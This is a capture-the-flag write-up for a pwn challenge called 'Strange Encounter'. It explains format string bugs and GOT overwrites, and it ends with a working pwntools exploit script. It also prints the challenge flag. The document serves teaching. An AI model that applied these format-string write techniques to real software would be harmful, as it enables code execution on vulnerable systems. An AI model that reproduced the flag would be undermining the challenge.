# 23. Strange Encounter

Author: kMadScientist

Phase 2 | pwn

Flag: `labyrinth{4n_3nc0un73r_W17h_4n_1mp0573r}`

## Description

Finally you manage to find your way into the last hallway of the 2nd layer. In front of you is the door that leads to the 3rd layer. But between you and the door, there seems to stand the Minotaur??? How could it possibly have made it this far? 

## Solve

This is a simple format strings challenge. The final goal of the challenge is to get a pie leak, and then overwrite a GOT entry with the win function address.

For alot of people, this will probably be your first time encountering this kind of challenge so I'll do my best to explain.

First, we always start by running `checksec` on the binary:

```
❯ checksec vuln_patched
[*] '/home/chhayank/Projects/ChallengeMaking/labyrinthCTF/23_strange_encounter/public/handout/vuln_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

We can see that we have all the normal binary protections but we only have partial RELRO. I won't attempt to explain all of the protections but I will explain the ones that are relevent to us solving this challenge:

***PIE enabled:*** PIE stands for Position Independent Executable. What this means is that the addresses of every function will be different each run, but the offsets between them will be constant. Hence, if we can get a pie leak, we can use that to calculate the addresses of any function using the offsets from the static binary.

***Partial RELRO:*** To understand this, one must understand what the Global Offset Table (GOT) is and how library functions are called in a C program. When a program tries to call an external library function, it uses the GOT to find the address of that function. This is a simplification, but it is sufficient for our current purposes. What RELRO does is it protects the GOT entries from being overwritten. However, since we only have partial RELRO, we can infact overwrite some GOT entries. To check the entries we can overwrite, we can use `pwndbg` which is a `gdb` config:

```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/chhayank/Projects/ChallengeMaking/labyrinthCTF/23_strange_encounter/public/handout/vuln_patched:
GOT protection: Partial RELRO | Found 7 GOT entries passing the filter
[0x555555558018] puts@GLIBC_2.2.5 -> 0x7ffff7c80e10 (puts) ◂— endbr64
[0x555555558020] __stack_chk_fail@GLIBC_2.4 -> 0x555555555040 ◂— endbr64
[0x555555558028] setbuf@GLIBC_2.2.5 -> 0x7ffff7c87fa0 (setbuf) ◂— endbr64
[0x555555558030] system@GLIBC_2.2.5 -> 0x555555555060 ◂— endbr64
[0x555555558038] printf@GLIBC_2.2.5 -> 0x7ffff7c606f0 (printf) ◂— endbr64
[0x555555558040] __isoc99_scanf@GLIBC_2.7 -> 0x7ffff7c62090 (__isoc99_scanf) ◂— endbr64
[0x555555558048] exit@GLIBC_2.2.5 -> 0x555555555090 ◂— endbr64
```

As you can see, if we edit any of these addresses to our win address, it will make it so that win will be called instead of that particular library function. For our purposes, we will overwrite the GOT entry for exit. Why we chose exit in particular and what will happen if we use the other GOT entries is left as an exercise for the reader.

Format strings are a class of exploits that occur when input is passed into format string functions (printf, sprintf, snprintf, etc) without being properly sanitised. For example, doing `printf(str)` instead of `printf("%s", str)` where str is a string that can be controlled by the user, either through direct input or through other means.

It occurs when the string that is being passed into the format string function contains a format string specifier. For example, suppose we call `printf(str)` and str contains `%p`. When the printf statement is executed, it will try to interpret the `%p`. This means that it will try to interpret a parameter which is not present. This allows us to leak register and stack values.

C also has a syntax where we can pass `%n$p` where n is any integer, to read that particular parameter. If we try to replace n from 1 to 30, we will see that we can get a pie leak at multiple places. For our purposes, we will use the leak at `%27$p` which is a leak that is available both when running the binary locally as well as on the remote server.

Another thing to keep in mind is the format strings offset. It is the number of pointers we must leak before we start leaking our input itself. Usually, this is achieved by doing something like `aaaaaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.` and then counting the number of pointers till we see `0x6161616161616161`. As you may be able to understand from below, for us it is 10.

```
Before you meet your demise, tell me your name: aaaaaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
aaaaaaaa0x7ffff7e1ab23.(nil).0x7ffff7d14932.(nil)
0x8.(nil).0x3c.(nil).0x7fffffffcac0.0x6161616161616161.0x70252e70252e7025.0x70252e.
```

Format strings also provide a way to write values into certain parameters using the `%n` format specifier. It is used to write the number of characters that have been printed so far into a parameter. We can even modify the write size using `%hn` or `%hhn`. The reason for the existence of the `%n` specifier is something that you can go and research on your own, but what matters is that now we have both a read and a write primitive.

Rather than writing a format string payload by hand, we can use the `fmtstr_payload` provided to us by pwntools. If you want, you can go and do some more in-depth research about format strings and try to make a manual payload. I would highly encourage this as an exercise if you are interested in learning.

This is the solve script that we will eventually arrive at if we follow what I laid out above:

```py
from pwn import *

p = process('./vuln_patched')
#p = remote('<remote link>', 1337, ssl=True)

context.encoding = 'ASCII'
context.arch = 'amd64'

p.recvuntil('name: ')
p.sendline(b'%27$p')
leak = int(p.recvuntil('\n', drop=True), 16)
print(hex(leak))
exitgot = leak+0x2DEF
print(hex(exitgot))
win = leak-0x50
print(hex(win))
pl = fmtstr_payload(10, {exitgot: win}, write_size='short')
print(pl)
p.sendline(pl)
p.interactive()
```
